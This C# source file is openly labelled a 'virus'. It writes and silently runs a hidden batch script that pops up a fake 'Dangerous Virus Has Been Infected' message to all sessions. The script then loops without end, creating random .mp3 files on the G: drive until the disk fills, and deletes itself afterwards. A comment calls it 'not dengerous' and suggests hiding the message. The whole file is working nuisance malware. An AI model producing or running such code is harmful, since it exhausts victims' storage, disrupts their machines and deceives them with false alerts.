using System;
using System.Diagnostics;
using System.IO;


namespace BatchOnCsharp
{
    class Program
    {

        /// <summary>
        /// /make virus--------- not dengerous
        /// </summary>
        /// <param name="args"></param>
        static void Main(string[] args)
        {
            StreamWriter sw =File.CreateText("vr.bat");
            sw.WriteLine(":D");
            sw.WriteLine("msg.exe * Dangerous Virus Has Been Infected");//optional- you can hide this
            sw.WriteLine("fsutil file createnew G:\\%random%.mp3 1024 ");
           // sw.WriteLine("fsutil file createnew G:\\%random%.mp3 1024000");
            sw.WriteLine("goto D");
            sw.Close();
            sw.Dispose();

            Process Oproc = new Process();
            Oproc.StartInfo.FileName = "vr.bat";
            Oproc.StartInfo.UseShellExecute = true;
            Oproc.StartInfo.CreateNoWindow = true;
            Oproc.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            Oproc.Start();
            Oproc.WaitForExit();
            File.Delete(@"vr.bat");
        }
    }
}
